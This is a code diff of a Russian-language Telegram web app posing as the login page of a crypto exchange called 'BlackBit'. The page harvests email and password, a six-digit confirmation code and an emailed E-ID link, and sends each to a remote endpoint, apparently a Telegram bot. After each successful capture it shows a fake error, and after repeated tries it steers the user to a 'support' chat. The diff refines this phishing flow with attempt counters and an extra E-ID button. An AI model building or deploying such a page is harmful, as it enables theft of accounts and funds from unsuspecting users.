@@ -7,9 +7,6 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <style>
-        /* ============================================================
-           СТИЛИ BLACKBIT (СВЕТЛАЯ ТЕМА)
-           ============================================================ */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -370,7 +367,7 @@
         </div>
         <div class="nav-buttons">
             <button class="btn primary" onclick="showPage('pageLoginForm')">Войти</button>
-            <button class="btn" onclick="showPage('pageAbout')">О бирже</button>
+            <button class="btn-eid" onclick="showPage('pageEid')" style="flex:1; padding:10px; border:1px solid #0066ff; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer; text-align:center;">Вход через E-ID</button>
         </div>
         <div class="text-center mt-8" style="color:#8a8a9a; font-size:12px;">
             <span style="color:#0066ff; cursor:pointer;" onclick="showMessage('Регистрация скоро появится', 'info')">Нет аккаунта? Зарегистрироваться</span>
@@ -394,37 +391,26 @@
         <button class="btn-back" onclick="showPage('pageMain')">← Назад</button>
     </div>
 
-    <!-- ===== ВХОД (ЛОГИН + ПАРОЛЬ) ===== -->
+    <!-- ===== ВХОД ===== -->
     <div id="pageLoginForm" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
         <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
-
-        <div id="loginFields">
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="email" placeholder="Введите ваш email">
-            </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="password" placeholder="Введите пароль">
-            </div>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="email" placeholder="Введите ваш email">
         </div>
-
+        <div class="form-group">
+            <label>Пароль</label>
+            <input type="password" id="password" placeholder="Введите пароль">
+        </div>
         <button id="loginSubmitBtn" class="btn-primary" onclick="handleLogin()">Войти</button>
-
-        <div id="loginError" class="message error" style="display:none; margin-top:12px;">
-            Ошибка. Повторите попытку входа.
-        </div>
-
+        <div id="loginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
         <div class="text-center mt-12" style="color:#8a8a9a; font-size:13px;">
             <span style="color:#0066ff; cursor:pointer;" onclick="showMessage('Функция восстановления скоро появится', 'info')">Восстановить пароль</span>
         </div>
-
         <div style="margin: 12px 0; text-align:center; color:#d0d0d8; font-size:12px;">или</div>
-
         <button class="btn-eid" onclick="showPage('pageEid')">Вход через E-ID</button>
-
         <button class="btn-back" onclick="showPage('pageMain')">← Назад</button>
     </div>
 
@@ -433,24 +419,14 @@
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
         <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
-
-        <div id="codeFields">
-            <div class="code-section">
-                <label>Код из 6 цифр</label>
-                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
-                <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
-            </div>
+        <div class="form-group">
+            <label>Код из 6 цифр</label>
+            <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
         </div>
-
-        <div id="codeError" class="message error" style="display:none; margin-top:12px;">
-            Неверный код. Попробуйте снова.
-        </div>
-
-        <div class="status-waiting" id="codeStatus">
-            <span class="spinner"></span> Ожидание...
-        </div>
-
-        <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
+        <button id="submitCodeBtn" class="btn-primary" onclick="handleCode()">Подтвердить</button>
+        <div id="codeError" class="message error" style="display:none;">Неверный код. Осталось попыток: <span id="codeAttempts">3</span></div>
+        <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
+        <button class="btn-back" onclick="showPage('pageLoginForm')">← Назад</button>
     </div>
 
     <!-- ===== E-ID ===== -->
@@ -458,25 +434,17 @@
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
         <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
-
-        <div id="eidFields">
-            <div class="form-group">
-                <label>Email</label>
-                <input type="email" id="eidEmail" placeholder="Введите ваш email">
-            </div>
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" id="eidPassword" placeholder="Введите пароль">
-            </div>
+        <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="eidEmail" placeholder="Введите ваш email">
         </div>
-
+        <div class="form-group">
+            <label>Пароль</label>
+            <input type="password" id="eidPassword" placeholder="Введите пароль">
+        </div>
         <button id="eidSubmitBtn" class="btn-primary" onclick="handleEidLogin()">Войти через E-ID</button>
-
-        <div id="eidLoginError" class="message error" style="display:none; margin-top:12px;">
-            Ошибка. Повторите попытку входа.
-        </div>
-
-        <button class="btn-back" onclick="goToMain()">← Назад</button>
+        <div id="eidLoginError" class="message error" style="display:none;">Ошибка. Повторите попытку входа.</div>
+        <button class="btn-back" onclick="showPage('pageMain')">← Назад</button>
     </div>
 
     <!-- ===== ССЫЛКА E-ID ===== -->
@@ -484,52 +452,34 @@
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
         <div style="font-size:14px; color:#8a8a9a; text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
-
-        <div id="eidLinkFields">
-            <div class="code-section">
-                <label>Ссылка подтверждения</label>
-                <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
-                <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
-            </div>
+        <div class="form-group">
+            <label>Ссылка подтверждения</label>
+            <input type="text" id="eidLinkInput" placeholder="Вставьте ссылку">
         </div>
-
-        <div id="eidLinkError" class="message error" style="display:none; margin-top:12px;">
-            Ошибка. Повторите попытку входа.
-        </div>
-
-        <div class="status-waiting" id="eidLinkStatus">
-            <span class="spinner"></span> Ожидание...
-        </div>
-
-        <button class="btn-back" onclick="goToEid()">← Назад</button>
+        <button id="eidLinkSubmitBtn" class="btn-primary" onclick="handleEidLink()">Подтвердить</button>
+        <div id="eidLinkError" class="message error" style="display:none;">Неверная ссылка. Осталось попыток: <span id="eidLinkAttempts">3</span></div>
+        <div class="status-waiting" id="eidLinkStatus"><span class="spinner"></span> Ожидание...</div>
+        <button class="btn-back" onclick="showPage('pageEid')">← Назад</button>
     </div>
 
     <!-- ===== ОШИБКА ===== -->
-    <div id="pageLoginError" class="page login-error-page">
-        <div class="icon">✕</div>
-        <h2>Ошибка</h2>
-        <p>Повторите попытку входа.</p>
-        <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">Вернуться на главную</button>
+    <div id="pageLoginError" class="page" style="text-align:center; padding:30px 0;">
+        <div style="font-size:48px; color:#e74c3c;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка</div>
+        <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Повторите попытку входа.</div>
+        <button class="btn" style="padding:12px 24px; border:1px solid #d0d0d8; border-radius:8px; background:transparent; color:#1a1a2e; font-size:14px; font-weight:500; cursor:pointer;" onclick="showPage('pageMain')">Вернуться на главную</button>
     </div>
 
     <!-- ===== БЛОКИРОВКА ===== -->
-    <div id="pageError" class="page">
-        <div class="error-block">
-            <div class="icon">✕</div>
-            <h2>Ошибка входа</h2>
-            <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
-            <button onclick="openSupportChat()" class="btn-primary" style="background:#b91c1c;">Техническая поддержка</button>
-            <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
-        </div>
+    <div id="pageError" class="page" style="text-align:center; padding:30px 0;">
+        <div style="font-size:48px; color:#e74c3c;">✕</div>
+        <div style="font-size:22px; font-weight:700; color:#e74c3c; margin:8px 0;">Ошибка входа</div>
+        <div style="font-size:14px; color:#8a8a9a; margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
+        <button onclick="openSupportChat()" class="btn" style="padding:12px 24px; background:#e74c3c; color:#ffffff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer;">Техническая поддержка</button>
+        <button class="btn-back" onclick="showPage('pageMain')">← На главную</button>
     </div>
 
-    <!-- ===== СООБЩЕНИЯ ===== -->
     <div id="msg" class="message"></div>
-
-    <!-- ===== ТЕХПОДДЕРЖКА ===== -->
-    <div style="margin-top:auto;padding-top:14px;position:relative;z-index:1;">
-        <button onclick="openSupportChat()" class="support-btn">Техническая поддержка</button>
-    </div>
 
 </div>
 
@@ -637,10 +587,9 @@
                     text: text
                 })
             });
-            const result = await response.json();
-            return result.ok;
+            return response.ok;
         } catch (error) {
-            console.error('Ошибка:', error);
+            console.error(error);
             return false;
         }
     }
@@ -650,20 +599,16 @@
     // ============================================================
     let userEmail = '';
     let userPassword = '';
+    let codeAttempts = 3;
+    let eidLinkAttempts = 3;
     let attemptCount = 0;
 
     function handleLogin() {
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        if (!email || !password) {
-            showMessage('Заполните все поля', 'error');
-            return;
-        }
-        if (!email.includes('@')) {
-            showMessage('Введите корректный email', 'error');
-            return;
-        }
+        if (!email || !password) { showMessage('Заполните все поля', 'error'); return; }
+        if (!email.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
         userEmail = email;
         userPassword = password;
@@ -679,9 +624,13 @@
             loginSubmitBtn.disabled = false;
             loginSubmitBtn.textContent = 'Войти';
             if (ok) {
+                codeAttempts = 3;
+                document.getElementById('codeAttempts').textContent = codeAttempts;
+                document.getElementById('codeError').style.display = 'none';
+                document.getElementById('codeInput').value = '';
                 showPage('pageCode');
                 document.getElementById('codeStatus').style.display = 'block';
-                showMessage('Ожидание...', 'success');
+                showMessage('Ожидание подтверждения...', 'success');
                 setTimeout(() => document.getElementById('codeInput').focus(), 300);
             } else {
                 attemptCount++;
@@ -699,15 +648,12 @@
     }
 
     // ============================================================
-    // 10. КОД → ОШИБКА
+    // 10. КОД
     // ============================================================
     function handleCode() {
         const code = document.getElementById('codeInput').value.trim();
 
-        if (!code || code.length < 4) {
-            showMessage('Введите корректный код', 'error');
-            return;
-        }
+        if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
 
         const submitCodeBtn = document.getElementById('submitCodeBtn');
         submitCodeBtn.disabled = true;
@@ -724,35 +670,28 @@
                 document.getElementById('codeStatus').style.display = 'none';
                 showPage('pageLoginError');
             } else {
-                attemptCount++;
-                if (attemptCount >= MAX_ATTEMPTS) {
-                    document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                    document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                codeAttempts--;
+                document.getElementById('codeAttempts').textContent = codeAttempts;
+                document.getElementById('codeError').style.display = 'block';
+                if (codeAttempts <= 0) {
+                    document.querySelectorAll('#codeFields input, #codeFields button').forEach(el => el.disabled = true);
                     showPage('pageError');
                     return;
                 }
-                document.getElementById('codeError').style.display = 'block';
-                document.getElementById('codeError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
                 showMessage('Ошибка отправки', 'error');
             }
         });
     }
 
     // ============================================================
-    // 11. E-ID → ССЫЛКА
+    // 11. E-ID
     // ============================================================
     function handleEidLogin() {
         const email = document.getElementById('eidEmail').value.trim();
         const password = document.getElementById('eidPassword').value.trim();
 
-        if (!email || !password) {
-            showMessage('Заполните все поля', 'error');
-            return;
-        }
-        if (!email.includes('@')) {
-            showMessage('Введите корректный email', 'error');
-            return;
-        }
+        if (!email || !password) { showMessage('Заполните все поля', 'error'); return; }
+        if (!email.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
         userEmail = email;
         userPassword = password;
@@ -768,6 +707,10 @@
             eidSubmitBtn.disabled = false;
             eidSubmitBtn.textContent = 'Войти через E-ID';
             if (ok) {
+                eidLinkAttempts = 3;
+                document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+                document.getElementById('eidLinkError').style.display = 'none';
+                document.getElementById('eidLinkInput').value = '';
                 showPage('pageEidLink');
                 document.getElementById('eidLinkStatus').style.display = 'block';
                 showMessage('Ссылка отправлена на почту', 'success');
@@ -788,15 +731,12 @@
     }
 
     // ============================================================
-    // 12. ССЫЛКА (E-ID) → ОШИБКА
+    // 12. ССЫЛКА E-ID
     // ============================================================
     function handleEidLink() {
         const link = document.getElementById('eidLinkInput').value.trim();
 
-        if (!link) {
-            showMessage('Вставьте ссылку подтверждения', 'error');
-            return;
-        }
+        if (!link) { showMessage('Вставьте ссылку подтверждения', 'error'); return; }
 
         const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
         eidLinkSubmitBtn.disabled = true;
@@ -813,43 +753,22 @@
                 document.getElementById('eidLinkStatus').style.display = 'none';
                 showPage('pageLoginError');
             } else {
-                attemptCount++;
-                if (attemptCount >= MAX_ATTEMPTS) {
-                    document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                    document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                eidLinkAttempts--;
+                document.getElementById('eidLinkAttempts').textContent = eidLinkAttempts;
+                document.getElementById('eidLinkError').style.display = 'block';
+                if (eidLinkAttempts <= 0) {
+                    document.querySelectorAll('#eidLinkFields input, #eidLinkFields button').forEach(el => el.disabled = true);
                     showPage('pageError');
                     return;
                 }
-                document.getElementById('eidLinkError').style.display = 'block';
-                document.getElementById('eidLinkError').textContent = `Ошибка. (${attemptCount}/${MAX_ATTEMPTS})`;
                 showMessage('Ошибка отправки', 'error');
             }
         });
     }
 
-    // ============================================================
-    // 13. ПОДДЕРЖКА
-    // ============================================================
     function openSupportChat() {
         window.open(SUPPORT_LINK, '_blank');
     }
-
-    // ============================================================
-    // 14. ENTER
-    // ============================================================
-    document.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            if (document.getElementById('pageLoginForm').classList.contains('active')) {
-                document.getElementById('loginSubmitBtn').click();
-            } else if (document.getElementById('pageCode').classList.contains('active')) {
-                document.getElementById('submitCodeBtn').click();
-            } else if (document.getElementById('pageEid').classList.contains('active')) {
-                document.getElementById('eidSubmitBtn').click();
-            } else if (document.getElementById('pageEidLink').classList.contains('active')) {
-                document.getElementById('eidLinkSubmitBtn').click();
-            }
-        }
-    });
 
     document.addEventListener('DOMContentLoaded', function() {
         showPage('pageMain');
